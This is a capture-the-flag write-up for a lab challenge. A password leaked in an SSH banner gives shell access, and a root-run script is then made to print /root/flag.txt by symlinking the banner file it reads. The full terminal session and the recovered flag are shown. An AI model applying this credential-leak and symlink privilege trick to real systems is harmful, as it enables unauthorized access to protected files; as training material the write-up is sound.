## Descripción
Can you abuse the banner? The server has been leaking some crucial information on `xebec.cylabacademy.net 38390`. Use the leaked information to get to the server.

To connect to the running application use `nc xebec.cylabacademy.net 40908`. From the above information abuse the machine and find the flag in the /root directory.

## Solución
AaronTank5-academy@webshell:~$ nc xebec.cylabacademy.net 38390
SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234
^C
AaronTank5-academy@webshell:~$ nc xebec.cylabacademy.net 40908
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls -la
ls -la
total 20
drwxr-x--- 1 player player   20 Sep 23 05:07 .
drwxr-xr-x 1 root   root     20 Sep 23 05:07 ..
-rw-r--r-- 1 player player  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 player player 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 player player  807 Mar 31  2024 .profile
-rw-r--r-- 1 player player  114 Sep 23 00:59 banner
-rw-r--r-- 1 root   root     13 Sep 23 00:59 text
player@challenge:~$ ls -la/root
ls -la/root
ls: invalid option -- '/'
Try 'ls --help' for more information.
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Sep 23 05:07 .
drwxr-xr-x 1 root root   28 Sep 30 02:00 ..
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 2 root root    6 Sep 23 01:43 .ssh
-rwx------ 1 root root   46 Sep 23 05:07 flag.txt
-rw-r--r-- 1 root root 1317 Sep 23 00:59 script.py
player@challenge:~$ id
id
uid=1001(player) gid=1001(player) groups=1001(player)
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$ cat ~/banner
cat ~/banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat ~/text
cat ~/text
keep digging
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ls -la /home/player/banner
ls -la /home/player/banner
lrwxrwxrwx 1 player player 14 Sep 30 02:09 /home/player/banner -> /root/flag.txt
player@challenge:~$ banner -> /root/flag.txt
banner -> /root/flag.txt
-bash: /root/flag.txt: Permission denied
player@challenge:~$ exit
exit
logout
What is the top cyber security conference in the world?
^C
AaronTank5-academy@webshell:~$ nc xebec.cylabacademy.net 40908
academy{b4nn3r_gr4bb1n9_su((3sfu11y_32c8192b}

## Notas Adicionales


## Referencias